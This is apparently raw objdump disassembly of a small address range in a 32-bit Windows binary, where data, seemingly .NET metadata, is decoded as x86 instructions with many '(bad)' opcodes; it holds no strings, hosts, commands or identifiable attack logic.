  4064ac:	86 18                	xchg   %bl,(%eax)
  4064ae:	c6                   	(bad)
  4064af:	15 06 00 4e 00       	adc    $0x4e0006,%eax
  4064b4:	4c                   	dec    %esp
  4064b5:	43                   	inc    %ebx
  4064b6:	00 00                	add    %al,(%eax)
  4064b8:	00 00                	add    %al,(%eax)
  4064ba:	83 00 6d             	addl   $0x6d,(%eax)
  4064bd:	01 bf 02 4e 00 5a    	add    %edi,0x5a004e02(%edi)
  4064c3:	43                   	inc    %ebx
  4064c4:	00 00                	add    %al,(%eax)
  4064c6:	00 00                	add    %al,(%eax)
  4064c8:	86 18                	xchg   %bl,(%eax)
  4064ca:	c6                   	(bad)
  4064cb:	15 06 00 4f 00       	adc    $0x4f0006,%eax
  4064d0:	62 43 00             	bound  %eax,0x0(%ebx)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 83 00 4f 01 bf    	add    %al,-0x40feb100(%ebx)
  4064db:	02 4f 00             	add    0x0(%edi),%cl
  4064de:	75 43                	jne    0x406523
  4064e0:	00 00                	add    %al,(%eax)
  4064e2:	00 00                	add    %al,(%eax)
  4064e4:	86 18                	xchg   %bl,(%eax)
  4064e6:	c6                   	(bad)
  4064e7:	15 06 00 50 00       	adc    $0x500006,%eax
  4064ec:	7d 43                	jge    0x406531
  4064ee:	00 00                	add    %al,(%eax)
  4064f0:	00 00                	add    %al,(%eax)
  4064f2:	83 00 ff             	addl   $0xffffffff,(%eax)
  4064f5:	00 bf 02 50 00 8b    	add    %bh,-0x74ffaffe(%edi)
  4064fb:	43                   	inc    %ebx
  4064fc:	00 00                	add    %al,(%eax)
  4064fe:	00 00                	add    %al,(%eax)
  406500:	83 00 d6             	addl   $0xffffffd6,(%eax)
  406503:	01 bf 02 51 00 99    	add    %edi,-0x66ffaefe(%edi)
  406509:	43                   	inc    %ebx
  40650a:	00 00                	add    %al,(%eax)
  40650c:	00 00                	add    %al,(%eax)
  40650e:	91                   	xchg   %eax,%ecx
  40650f:	18 cc                	sbb    %cl,%ah
  406511:	15 cf 04 52 00       	adc    $0x5204cf,%eax
  406516:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406517:	43                   	inc    %ebx
  406518:	00 00                	add    %al,(%eax)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	86 18                	xchg   %bl,(%eax)
  40651e:	c6                   	(bad)
  40651f:	15 06 00 52 00       	adc    $0x520006,%eax
  406524:	ad                   	lods   %ds:(%esi),%eax
  406525:	43                   	inc    %ebx
  406526:	00 00                	add    %al,(%eax)
  406528:	00 00                	add    %al,(%eax)
  40652a:	83 00 ba             	addl   $0xffffffba,(%eax)
  40652d:	00 06                	add    %al,(%esi)
  40652f:	00 52 00             	add    %dl,0x0(%edx)
  406532:	be 43 00 00 00       	mov    $0x43,%esi
  406537:	00 86 18 c6 15 06    	add    %al,0x615c618(%esi)
  40653d:	00 52 00             	add    %dl,0x0(%edx)
  406540:	c8 43 00 00          	enter  $0x43,$0x0
  406544:	00 00                	add    %al,(%eax)
  406546:	83 00 29             	addl   $0x29,(%eax)
  406549:	01 06                	add    %eax,(%esi)
  40654b:	00 52 00             	add    %dl,0x0(%edx)
  40654e:	b0 44                	mov    $0x44,%al
  406550:	00 00                	add    %al,(%eax)
  406552:	00 00                	add    %al,(%eax)
  406554:	86 18                	xchg   %bl,(%eax)
  406556:	c6                   	(bad)
  406557:	15 06 00 52 00       	adc    $0x520006,%eax
  40655c:	b8 44 00 00 00       	mov    $0x44,%eax
  406561:	00 86 18 c6 15 06    	add    %al,0x615c618(%esi)
  406567:	00 52 00             	add    %dl,0x0(%edx)
  40656a:	c0 44 00 00 00       	rolb   $0x0,0x0(%eax,%eax,1)
  40656f:	00 83 00 ea 01 1c    	add    %al,0x1c01ea00(%ebx)
  406575:	03 52 00             	add    0x0(%edx),%edx
  406578:	04 45                	add    $0x45,%al
  40657a:	00 00                	add    %al,(%eax)
  40657c:	00 00                	add    %al,(%eax)
  40657e:	e1 01                	loope  0x406581
  406580:	0f 1d 06             	nopl   (%esi)
  406583:	00 52 00             	add    %dl,0x0(%edx)
  406586:	cc                   	int3
  406587:	47                   	inc    %edi
  406588:	00 00                	add    %al,(%eax)
  40658a:	00 00                	add    %al,(%eax)
  40658c:	e1 01                	loope  0x40658f
  40658e:	94                   	xchg   %eax,%esp
  40658f:	0a 27                	or     (%edi),%ah
  406591:	00 52 00             	add    %dl,0x0(%edx)
  406594:	dc 47 00             	faddl  0x0(%edi)
  406597:	00 00                	add    %al,(%eax)
  406599:	00 e1                	add    %ah,%cl
  40659b:	01 0f                	add    %ecx,(%edi)
  40659d:	1d 06 00 53 00       	sbb    $0x530006,%eax
  4065a2:	b0 48                	mov    $0x48,%al
  4065a4:	00 00                	add    %al,(%eax)
  4065a6:	00 00                	add    %al,(%eax)
  4065a8:	e1 01                	loope  0x4065ab
  4065aa:	94                   	xchg   %eax,%esp
  4065ab:	0a 27                	or     (%edi),%ah
  4065ad:	00 53 00             	add    %dl,0x0(%ebx)
  4065b0:	be 48 00 00 00       	mov    $0x48,%esi
  4065b5:	00 91 18 cc 15 cf    	add    %dl,-0x30ea33e8(%ecx)
  4065bb:	04 54                	add    $0x54,%al
  4065bd:	00 ca                	add    %cl,%dl
  4065bf:	48                   	dec    %eax
  4065c0:	00 00                	add    %al,(%eax)
  4065c2:	00 00                	add    %al,(%eax)
  4065c4:	86 18                	xchg   %bl,(%eax)
  4065c6:	c6                   	(bad)
  4065c7:	15 06 00 54 00       	adc    $0x540006,%eax
  4065cc:	d4 48                	aam    $0x48
  4065ce:	00 00                	add    %al,(%eax)
  4065d0:	00 00                	add    %al,(%eax)
  4065d2:	83 00 2e             	addl   $0x2e,(%eax)
  4065d5:	00 06                	add    %al,(%esi)
  4065d7:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  4065db:	49                   	dec    %ecx
  4065dc:	00 00                	add    %al,(%eax)
  4065de:	00 00                	add    %al,(%eax)
  4065e0:	e1 01                	loope  0x4065e3
  4065e2:	0f 1d 06             	nopl   (%esi)
  4065e5:	00 54 00 24          	add    %dl,0x24(%eax,%eax,1)
  4065e9:	4b                   	dec    %ebx
  4065ea:	00 00                	add    %al,(%eax)
  4065ec:	00 00                	add    %al,(%eax)
  4065ee:	e1 01                	loope  0x4065f1
  4065f0:	94                   	xchg   %eax,%esp
  4065f1:	0a 27                	or     (%edi),%ah
  4065f3:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
  4065f7:	4b                   	dec    %ebx
  4065f8:	00 00                	add    %al,(%eax)
  4065fa:	00 00                	add    %al,(%eax)
  4065fc:	91                   	xchg   %eax,%ecx
  4065fd:	18 cc                	sbb    %cl,%ah
  4065ff:	15 cf 04 55 00       	adc    $0x5504cf,%eax
  406604:	3e 4b                	ds dec %ebx
  406606:	00 00                	add    %al,(%eax)
  406608:	00 00                	add    %al,(%eax)
  40660a:	86 18                	xchg   %bl,(%eax)
  40660c:	c6                   	(bad)
  40660d:	15 06 00 55 00       	adc    $0x550006,%eax
  406612:	48                   	dec    %eax
  406613:	4b                   	dec    %ebx
  406614:	00 00                	add    %al,(%eax)
  406616:	00 00                	add    %al,(%eax)
  406618:	83 00 20             	addl   $0x20,(%eax)
  40661b:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40661e:	55                   	push   %ebp
  40661f:	00 84 4b 00 00 00 00 	add    %al,0x0(%ebx,%ecx,2)
  406626:	e1 01                	loope  0x406629
  406628:	0f 1d 06             	nopl   (%esi)
  40662b:	00 55 00             	add    %dl,0x0(%ebp)
  40662e:	10 4d 00             	adc    %cl,0x0(%ebp)
  406631:	00 00                	add    %al,(%eax)
  406633:	00 e1                	add    %ah,%cl
  406635:	01 94 0a 27 00 55 00 	add    %edx,0x550027(%edx,%ecx,1)
  40663c:	1e                   	push   %ds
  40663d:	4d                   	dec    %ebp
  40663e:	00 00                	add    %al,(%eax)
  406640:	00 00                	add    %al,(%eax)
  406642:	91                   	xchg   %eax,%ecx
  406643:	18 cc                	sbb    %cl,%ah
  406645:	15 cf 04 56 00       	adc    $0x5604cf,%eax
  40664a:	2a 4d 00             	sub    0x0(%ebp),%cl
  40664d:	00 00                	add    %al,(%eax)
  40664f:	00 86 18 c6 15 06    	add    %al,0x615c618(%esi)
  406655:	00 56 00             	add    %dl,0x0(%esi)
  406658:	34 4d                	xor    $0x4d,%al
  40665a:	00 00                	add    %al,(%eax)
  40665c:	00 00                	add    %al,(%eax)
  40665e:	83 00 5a             	addl   $0x5a,(%eax)
  406661:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  406664:	56                   	push   %esi
  406665:	00 6f 4d             	add    %ch,0x4d(%edi)
  406668:	00 00                	add    %al,(%eax)
  40666a:	00 00                	add    %al,(%eax)
  40666c:	86 18                	xchg   %bl,(%eax)
  40666e:	c6                   	(bad)
  40666f:	15 06 00 56 00       	adc    $0x560006,%eax
  406674:	77 4d                	ja     0x4066c3
  406676:	00 00                	add    %al,(%eax)
  406678:	00 00                	add    %al,(%eax)
  40667a:	83 00 13             	addl   $0x13,(%eax)
  40667d:	01 06                	add    %eax,(%esi)
  40667f:	00 56 00             	add    %dl,0x0(%esi)
  406682:	8c 4d 00             	mov    %cs,0x0(%ebp)
  406685:	00 00                	add    %al,(%eax)
  406687:	00 e1                	add    %ah,%cl
  406689:	01 0f                	add    %ecx,(%edi)
  40668b:	1d 06 00 56 00       	sbb    $0x560006,%eax
  406690:	04 4f                	add    $0x4f,%al
  406692:	00 00                	add    %al,(%eax)
  406694:	00 00                	add    %al,(%eax)
  406696:	e1 01                	loope  0x406699
  406698:	94                   	xchg   %eax,%esp
  406699:	0a 27                	or     (%edi),%ah
  40669b:	00 56 00             	add    %dl,0x0(%esi)
  40669e:	14 4f                	adc    $0x4f,%al
  4066a0:	00 00                	add    %al,(%eax)
  4066a2:	00 00                	add    %al,(%eax)
  4066a4:	e1 01                	loope  0x4066a7
  4066a6:	0f 1d 06             	nopl   (%esi)
  4066a9:	00 57 00             	add    %dl,0x0(%edi)
  4066ac:	44                   	inc    %esp
  4066ad:	52                   	push   %edx
  4066ae:	00 00                	add    %al,(%eax)
  4066b0:	00 00                	add    %al,(%eax)
  4066b2:	e1 01                	loope  0x4066b5
  4066b4:	94                   	xchg   %eax,%esp
  4066b5:	0a 27                	or     (%edi),%ah
  4066b7:	00 57 00             	add    %dl,0x0(%edi)
  4066ba:	54                   	push   %esp
  4066bb:	52                   	push   %edx
  4066bc:	00 00                	add    %al,(%eax)
  4066be:	00 00                	add    %al,(%eax)
  4066c0:	e1 01                	loope  0x4066c3
  4066c2:	0f 1d 06             	nopl   (%esi)
  4066c5:	00 58 00             	add    %bl,0x0(%eax)
  4066c8:	d0 54 00 00          	rclb   $1,0x0(%eax,%eax,1)
  4066cc:	00 00                	add    %al,(%eax)
  4066ce:	e1 01                	loope  0x4066d1
  4066d0:	94                   	xchg   %eax,%esp
  4066d1:	0a 27                	or     (%edi),%ah
  4066d3:	00 58 00             	add    %bl,0x0(%eax)
  4066d6:	e0 54                	loopne 0x40672c
  4066d8:	00 00                	add    %al,(%eax)
  4066da:	00 00                	add    %al,(%eax)
  4066dc:	e1 01                	loope  0x4066df
  4066de:	0f 1d 06             	nopl   (%esi)
  4066e1:	00 59 00             	add    %bl,0x0(%ecx)
  4066e4:	54                   	push   %esp
  4066e5:	56                   	push   %esi
  4066e6:	00 00                	add    %al,(%eax)
  4066e8:	00 00                	add    %al,(%eax)
  4066ea:	e1 01                	loope  0x4066ed
  4066ec:	94                   	xchg   %eax,%esp
  4066ed:	0a 27                	or     (%edi),%ah
  4066ef:	00 59 00             	add    %bl,0x0(%ecx)
  4066f2:	00 00                	add    %al,(%eax)
  4066f4:	01 00                	add    %eax,(%eax)
  4066f6:	da 08                	fimull (%eax)
  4066f8:	00 00                	add    %al,(%eax)
  4066fa:	02 00                	add    (%eax),%al
  4066fc:	22 09                	and    (%ecx),%cl
  4066fe:	00 00                	add    %al,(%eax)
  406700:	01 00                	add    %eax,(%eax)
  406702:	79 09                	jns    0x40670d
  406704:	00 00                	add    %al,(%eax)
  406706:	01 00                	add    %eax,(%eax)
  406708:	55                   	push   %ebp
  406709:	1a 00                	sbb    (%eax),%al
  40670b:	00 02                	add    %al,(%edx)
  40670d:	00 2b                	add    %ch,(%ebx)
  40670f:	0e                   	push   %cs
  406710:	00 00                	add    %al,(%eax)
  406712:	03 00                	add    (%eax),%eax
  406714:	28 1b                	sub    %bl,(%ebx)
  406716:	02 00                	add    (%eax),%al
  406718:	04 00                	add    $0x0,%al
  40671a:	00 1b                	add    %bl,(%ebx)
  40671c:	00 00                	add    %al,(%eax)
  40671e:	01 00                	add    %eax,(%eax)
  406720:	be 19 00 00 02       	mov    $0x2000019,%esi
  406725:	00 9e 08 00 00 03    	add    %bl,0x3000008(%esi)
  40672b:	00 08                	add    %cl,(%eax)
  40672d:	06                   	push   %es
  40672e:	00 00                	add    %al,(%eax)
  406730:	01 00                	add    %eax,(%eax)
  406732:	cc                   	int3
  406733:	19 00                	sbb    %eax,(%eax)
  406735:	00 02                	add    %al,(%edx)
  406737:	00 55 1a             	add    %dl,0x1a(%ebp)
  40673a:	00 00                	add    %al,(%eax)
  40673c:	03 00                	add    (%eax),%eax
  40673e:	2b 0e                	sub    (%esi),%ecx
  406740:	00 00                	add    %al,(%eax)
  406742:	04 00                	add    $0x0,%al
  406744:	f8                   	clc
  406745:	0a 00                	or     (%eax),%al
  406747:	00 05 00 1e 1b 00    	add    %al,0x1b1e00
  40674d:	00 01                	add    %al,(%ecx)
  40674f:	00 cc                	add    %cl,%ah
  406751:	19 00                	sbb    %eax,(%eax)
  406753:	00 02                	add    %al,(%edx)
  406755:	00 34 1a             	add    %dh,(%edx,%ebx,1)
  406758:	00 00                	add    %al,(%eax)
  40675a:	03 00                	add    (%eax),%eax
  40675c:	30 14 00             	xor    %dl,(%eax,%eax,1)
  40675f:	00 04 00             	add    %al,(%eax,%eax,1)
  406762:	32 0e                	xor    (%esi),%cl
  406764:	02 00                	add    (%eax),%al
  406766:	05 00 d6 11 00       	add    $0x11d600,%eax
  40676b:	00 01                	add    %al,(%ecx)
  40676d:	00 cc                	add    %cl,%ah
  40676f:	19 00                	sbb    %eax,(%eax)
  406771:	00 02                	add    %al,(%edx)
  406773:	00 4c 17 00          	add    %cl,0x0(%edi,%edx,1)
  406777:	00 03                	add    %al,(%ebx)
  406779:	00 1f                	add    %bl,(%edi)
  40677b:	0e                   	push   %cs
  40677c:	00 00                	add    %al,(%eax)
  40677e:	04 00                	add    $0x0,%al
  406780:	5f                   	pop    %edi
  406781:	1a 00                	sbb    (%eax),%al
  406783:	00 05 00 d2 14 00    	add    %al,0x14d200
  406789:	00 06                	add    %al,(%esi)
  40678b:	00 d1                	add    %dl,%cl
  40678d:	17                   	pop    %ss
  40678e:	02 00                	add    (%eax),%al
  406790:	07                   	pop    %es
  406791:	00 fd                	add    %bh,%ch
  406793:	05 00 00 01 00       	add    $0x10000,%eax
  406798:	d1 1a                	rcrl   $1,(%edx)
  40679a:	00 00                	add    %al,(%eax)
  40679c:	01 00                	add    %eax,(%eax)
  40679e:	9a 1d 00 00 01 00 ab 	lcall  $0xab00,$0x100001d
  4067a5:	09 00                	or     %eax,(%eax)
  4067a7:	00 02                	add    %al,(%edx)
  4067a9:	00 41 06             	add    %al,0x6(%ecx)
  4067ac:	00 00                	add    %al,(%eax)
  4067ae:	01 00                	add    %eax,(%eax)
  4067b0:	e1 17                	loope  0x4067c9
  4067b2:	00 00                	add    %al,(%eax)
  4067b4:	01 00                	add    %eax,(%eax)
  4067b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4067b7:	09 00                	or     %eax,(%eax)
  4067b9:	00 01                	add    %al,(%ecx)
  4067bb:	00 da                	add    %bl,%dl
  4067bd:	08 00                	or     %al,(%eax)
  4067bf:	00 02                	add    %al,(%edx)
  4067c1:	00 22                	add    %ah,(%edx)
  4067c3:	09 00                	or     %eax,(%eax)
  4067c5:	00 01                	add    %al,(%ecx)
  4067c7:	00 55 1a             	add    %dl,0x1a(%ebp)
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	02 00                	add    (%eax),%al
  4067ce:	2b 0e                	sub    (%esi),%ecx
  4067d0:	00 00                	add    %al,(%eax)
  4067d2:	03 00                	add    (%eax),%eax
  4067d4:	28 1b                	sub    %bl,(%ebx)
  4067d6:	02 00                	add    (%eax),%al
  4067d8:	04 00                	add    $0x0,%al
  4067da:	00 1b                	add    %bl,(%ebx)
  4067dc:	00 00                	add    %al,(%eax)
  4067de:	01 00                	add    %eax,(%eax)
  4067e0:	da 08                	fimull (%eax)
  4067e2:	00 00                	add    %al,(%eax)
  4067e4:	02 00                	add    (%eax),%al
  4067e6:	22 09                	and    (%ecx),%cl
  4067e8:	00 00                	add    %al,(%eax)
  4067ea:	01 00                	add    %eax,(%eax)
  4067ec:	79 09                	jns    0x4067f7
  4067ee:	00 00                	add    %al,(%eax)
  4067f0:	01 00                	add    %eax,(%eax)
  4067f2:	55                   	push   %ebp
  4067f3:	1a 00                	sbb    (%eax),%al
  4067f5:	00 02                	add    %al,(%edx)
  4067f7:	00 2b                	add    %ch,(%ebx)
  4067f9:	0e                   	push   %cs
  4067fa:	00 00                	add    %al,(%eax)
  4067fc:	03 00                	add    (%eax),%eax
  4067fe:	28 1b                	sub    %bl,(%ebx)
  406800:	02 00                	add    (%eax),%al
  406802:	04 00                	add    $0x0,%al
  406804:	00 1b                	add    %bl,(%ebx)
  406806:	00 00                	add    %al,(%eax)
  406808:	01 00                	add    %eax,(%eax)
  40680a:	76 0f                	jbe    0x40681b
  40680c:	00 00                	add    %al,(%eax)
  40680e:	01 00                	add    %eax,(%eax)
  406810:	4e                   	dec    %esi
  406811:	10 00                	adc    %al,(%eax)
  406813:	00 02                	add    %al,(%edx)
  406815:	00 12                	add    %dl,(%edx)
  406817:	05 00 00 03 00       	add    $0x30000,%eax
  40681c:	e6 06                	out    %al,$0x6
  40681e:	00 00                	add    %al,(%eax)
  406820:	01 00                	add    %eax,(%eax)
  406822:	38 07                	cmp    %al,(%edi)
  406824:	00 00                	add    %al,(%eax)
  406826:	01 00                	add    %eax,(%eax)
  406828:	ac                   	lods   %ds:(%esi),%al
  406829:	0f 00 00             	sldt   (%eax)
  40682c:	02 00                	add    (%eax),%al
  40682e:	06                   	push   %es
  40682f:	0e                   	push   %cs
  406830:	00 00                	add    %al,(%eax)
  406832:	01 00                	add    %eax,(%eax)
  406834:	bb 13 00 00 01       	mov    $0x1000013,%ebx
  406839:	00 be 11 00 00 01    	add    %bh,0x1000011(%esi)
  40683f:	00 38                	add    %bh,(%eax)
  406841:	07                   	pop    %es
  406842:	00 00                	add    %al,(%eax)
  406844:	01 00                	add    %eax,(%eax)
  406846:	bb 13 00 00 01       	mov    $0x1000013,%ebx
  40684b:	00 7a 1c             	add    %bh,0x1c(%edx)
  40684e:	00 00                	add    %al,(%eax)
  406850:	02 00                	add    (%eax),%al
  406852:	45                   	inc    %ebp
  406853:	1c 00                	sbb    $0x0,%al
  406855:	00 03                	add    %al,(%ebx)
  406857:	00 d9                	add    %bl,%cl
  406859:	1c 00                	sbb    $0x0,%al
  40685b:	00 01                	add    %al,(%ecx)
  40685d:	00 dd                	add    %bl,%ch
  40685f:	0f 00 00             	sldt   (%eax)
  406862:	01 00                	add    %eax,(%eax)
  406864:	bb 13 00 00 02       	mov    $0x2000013,%ebx
  406869:	00 56 0f             	add    %dl,0xf(%esi)
  40686c:	00 00                	add    %al,(%eax)
  40686e:	01 00                	add    %eax,(%eax)
  406870:	b7 0f                	mov    $0xf,%bh
  406872:	00 00                	add    %al,(%eax)
  406874:	01 00                	add    %eax,(%eax)
  406876:	76 0f                	jbe    0x406887
  406878:	00 00                	add    %al,(%eax)
  40687a:	01 00                	add    %eax,(%eax)
  40687c:	76 0f                	jbe    0x40688d
  40687e:	00 00                	add    %al,(%eax)
  406880:	01 00                	add    %eax,(%eax)
  406882:	d1 0f                	rorl   $1,(%edi)
  406884:	00 00                	add    %al,(%eax)
  406886:	01 00                	add    %eax,(%eax)
  406888:	5d                   	pop    %ebp
  406889:	02 00                	add    (%eax),%al
  40688b:	00 02                	add    %al,(%edx)
  40688d:	00 fa                	add    %bh,%dl
  40688f:	02 00                	add    (%eax),%al
  406891:	00 01                	add    %al,(%ecx)
  406893:	00 20                	add    %ah,(%eax)
  406895:	08 00                	or     %al,(%eax)
  406897:	00 01                	add    %al,(%ecx)
  406899:	00 ed                	add    %ch,%ch
  40689b:	0f 00 00             	sldt   (%eax)
  40689e:	01 00                	add    %eax,(%eax)
  4068a0:	20 08                	and    %cl,(%eax)
  4068a2:	00 00                	add    %al,(%eax)
  4068a4:	01 00                	add    %eax,(%eax)
  4068a6:	7e 0f                	jle    0x4068b7
  4068a8:	00 00                	add    %al,(%eax)
  4068aa:	02 00                	add    (%eax),%al
  4068ac:	b7 0f                	mov    $0xf,%bh
  4068ae:	00 00                	add    %al,(%eax)
  4068b0:	03 00                	add    (%eax),%eax
  4068b2:	1b 15 00 00 01 00    	sbb    0x10000,%edx
  4068b8:	04 10                	add    $0x10,%al
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	01 00                	add    %eax,(%eax)
  4068be:	9e                   	sahf
  4068bf:	1d 00 00 01 00       	sbb    $0x10000,%eax
  4068c4:	86 09                	xchg   %cl,(%ecx)
  4068c6:	00 00                	add    %al,(%eax)
  4068c8:	01 00                	add    %eax,(%eax)
  4068ca:	b2 05                	mov    $0x5,%dl
  4068cc:	00 00                	add    %al,(%eax)
  4068ce:	01 00                	add    %eax,(%eax)
  4068d0:	8a 11                	mov    (%ecx),%dl
  4068d2:	00 00                	add    %al,(%eax)
  4068d4:	01 00                	add    %eax,(%eax)
  4068d6:	8a 11                	mov    (%ecx),%dl
  4068d8:	00 00                	add    %al,(%eax)
  4068da:	01 00                	add    %eax,(%eax)
  4068dc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4068dd:	0a 00                	or     (%eax),%al
  4068df:	00 01                	add    %al,(%ecx)
  4068e1:	00 a4 0a 00 00 01 00 	add    %ah,0x10000(%edx,%ecx,1)
  4068e8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4068e9:	0a 00                	or     (%eax),%al
  4068eb:	00 01                	add    %al,(%ecx)
  4068ed:	00 a4 0a 00 00 01 00 	add    %ah,0x10000(%edx,%ecx,1)
  4068f4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4068f5:	0a 00                	or     (%eax),%al
  4068f7:	00 01                	add    %al,(%ecx)
  4068f9:	00 a4 0a 00 00 01 00 	add    %ah,0x10000(%edx,%ecx,1)
  406900:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406901:	0a 00                	or     (%eax),%al
  406903:	00 01                	add    %al,(%ecx)
  406905:	00 a4 0a 22 00 e5 00 	add    %ah,0xe50022(%edx,%ecx,1)
  40690c:	23 00                	and    (%eax),%eax
  40690e:	e5 00                	in     $0x0,%eax
  406910:	25 00 e5 00 27       	and    $0x2700e500,%eax
  406915:	00 e5                	add    %ah,%ch
  406917:	00 2a                	add    %ch,(%edx)
  406919:	00 e5                	add    %ah,%ch
  40691b:	00 2d 00 e5 00 2e    	add    %ch,0x2e00e500
  406921:	00 e5                	add    %ah,%ch
  406923:	00 2f                	add    %ch,(%edi)
  406925:	00 e5                	add    %ah,%ch
  406927:	00 09                	add    %cl,(%ecx)
  406929:	00 c6                	add    %al,%dh
  40692b:	15 01 00 11 00       	adc    $0x110001,%eax
  406930:	c6                   	(bad)
  406931:	15 06 00 19 00       	adc    $0x190006,%eax
  406936:	c6                   	(bad)
  406937:	15 0a 00 29 00       	adc    $0x29000a,%eax
  40693c:	c6                   	(bad)
  40693d:	15 10 00 31 00       	adc    $0x310010,%eax
  406942:	c6                   	(bad)
  406943:	15 10 00 39 00       	adc    $0x390010,%eax
  406948:	c6                   	(bad)
  406949:	15 10 00 41 00       	adc    $0x410010,%eax
  40694e:	c6                   	(bad)
  40694f:	15 10 00 49 00       	adc    $0x490010,%eax
  406954:	c6                   	(bad)
  406955:	15 10 00 51 00       	adc    $0x510010,%eax
  40695a:	c6                   	(bad)
  40695b:	15 10 00 59 00       	adc    $0x590010,%eax
  406960:	c6                   	(bad)
  406961:	15 10 00 61 00       	adc    $0x610010,%eax
  406966:	c6                   	(bad)
  406967:	15 15 00 69 00       	adc    $0x690015,%eax
  40696c:	c6                   	(bad)
  40696d:	15 10 00 71 00       	adc    $0x710010,%eax
  406972:	c6                   	(bad)
  406973:	15 10 00 79 00       	adc    $0x790010,%eax
  406978:	c6                   	(bad)
  406979:	15 10 00 89 00       	adc    $0x890010,%eax
  40697e:	c6                   	(bad)
  40697f:	15 1a 00 91 00       	adc    $0x91001a,%eax
  406984:	c6                   	(bad)
  406985:	15 06 00 c1 00       	adc    $0xc10006,%eax
  40698a:	c6                   	(bad)
  40698b:	15 06 00 31 01       	adc    $0x1310006,%eax
  406990:	c6                   	(bad)
  406991:	15 20 00 c9 01       	adc    $0x1c90020,%eax
  406996:	0f 1d 06             	nopl   (%esi)
  406999:	00 c9                	add    %cl,%cl
  40699b:	01 94 0a 27 00 e1 01 	add    %edx,0x1e10027(%edx,%ecx,1)
  4069a2:	c6                   	(bad)
  4069a3:	15 06 00 f1 01       	adc    $0x1f10006,%eax
  4069a8:	c6                   	(bad)
  4069a9:	15 06 00 31 02       	adc    $0x2310006,%eax
  4069ae:	b1 0a                	mov    $0xa,%cl
  4069b0:	2e 00 a1 00 ea 1d 32 	add    %ah,%cs:0x321dea00(%ecx)
  4069b7:	00 a1 00 e9 0d 38    	add    %ah,0x380de900(%ecx)
  4069bd:	00 a1 00 75 0b 06    	add    %ah,0x60b7500(%ecx)
  4069c3:	00 49 02             	add    %cl,0x2(%ecx)
  4069c6:	c6                   	(bad)
  4069c7:	15 06 00 49 02       	adc    $0x2490006,%eax
  4069cc:	38 09                	cmp    %cl,(%ecx)
  4069ce:	10 00                	adc    %al,(%eax)
  4069d0:	49                   	dec    %ecx
  4069d1:	02 85 1a 10 00 49    	add    0x4900101a(%ebp),%al
  4069d7:	02 6c 1d 15          	add    0x15(%ebp,%ebx,1),%ch
  4069db:	00 49 02             	add    %cl,0x2(%ecx)
  4069de:	b9 0d 15 00 c9       	mov    $0xc900150d,%ecx
  4069e3:	00 28                	add    %ch,(%eax)
  4069e5:	1c 41                	sbb    $0x41,%al
  4069e7:	00 51 02             	add    %dl,0x2(%ecx)
  4069ea:	84 1b                	test   %bl,(%ebx)
  4069ec:	50                   	push   %eax
  4069ed:	00 61 02             	add    %ah,0x2(%ecx)
  4069f0:	ce                   	into
  4069f1:	1d 55 00 79 02       	sbb    $0x2790055,%eax
  4069f6:	38 1e                	cmp    %bl,(%esi)
  4069f8:	5f                   	pop    %edi
  4069f9:	00 81 02 93 1a 68    	add    %al,0x681a9302(%ecx)
  4069ff:	00 c9                	add    %cl,%cl
  406a01:	00 28                	add    %ch,(%eax)
  406a03:	1c 7c                	sbb    $0x7c,%al
  406a05:	00 31                	add    %dh,(%ecx)
  406a07:	02 c6                	add    %dh,%al
  406a09:	14 2e                	adc    $0x2e,%al
  406a0b:	00 a1 00 f7 1d 83    	add    %ah,-0x7ce20900(%ecx)
  406a11:	00 a1 00 0f 17 8a    	add    %ah,-0x75e8f100(%ecx)
  406a17:	00 a1 00 d4 0d 8f    	add    %ah,-0x70f22c00(%ecx)
  406a1d:	00 89 02 9e 0f 95    	add    %cl,-0x6af061fe(%ecx)
  406a23:	00 99 02 79 0a 9c    	add    %bl,-0x63f586fe(%ecx)
  406a29:	00 a1 02 93 1a 68    	add    %ah,0x681a9302(%ecx)
  406a2f:	00 a1 02 95 0b a2    	add    %ah,-0x5df46afe(%ecx)
  406a35:	00 89 02 92 17 a8    	add    %cl,-0x57e86dfe(%ecx)
  406a3b:	00 a1 02 06 17 ad    	add    %ah,-0x52e8f9fe(%ecx)
  406a41:	00 81 02 95 0b b7    	add    %al,-0x48f46afe(%ecx)
  406a47:	00 c9                	add    %cl,%cl
  406a49:	00 f1                	add    %dh,%cl
  406a4b:	19 bc 00 c9 00 e2 08 	sbb    %edi,0x8e200c9(%eax,%eax,1)
  406a52:	c1 00 b1             	roll   $0xb1,(%eax)
  406a55:	02 2b                	add    (%ebx),%ch
  406a57:	09 c7                	or     %eax,%edi
  406a59:	00 b9 02 ae 1a cb    	add    %bh,-0x34e551fe(%ecx)
  406a5f:	00 b9 00 c6 15 d2    	add    %bh,-0x2dea3a00(%ecx)
  406a65:	00 c1                	add    %al,%cl
  406a67:	02 c6                	add    %dh,%al
  406a69:	15 d8 00 c1 02       	adc    $0x2c100d8,%eax
  406a6e:	5b                   	pop    %ebx
  406a6f:	07                   	pop    %es
  406a70:	15 00 c1 02 28       	adc    $0x2802c100,%eax
  406a75:	1c 06                	sbb    $0x6,%al
  406a77:	00 a9 00 13 1d e9    	add    %ch,-0x16e2ed00(%ecx)
  406a7d:	00 c1                	add    %al,%cl
  406a7f:	02 b5 13 ef 00 b1    	add    -0x4eff10ed(%ebp),%dh
  406a85:	00 59 1d             	add    %bl,0x1d(%ecx)
  406a88:	f4                   	hlt
  406a89:	00 b1 00 02 16 f9    	add    %dh,-0x6e9fe00(%ecx)
  406a8f:	00 89 02 0f 1c ff    	add    %cl,-0xe3f0fe(%ecx)
  406a95:	00 b1 00 8d 11 03    	add    %dh,0x3118d00(%ecx)
  406a9b:	01 a9 00 c6 15 06    	add    %ebp,0x615c600(%ecx)
  406aa1:	00 c9                	add    %cl,%cl
  406aa3:	02 9f 07 cb 00 b9    	add    -0x46ff34f9(%edi),%bl
  406aa9:	02 e2                	add    %dl,%ah
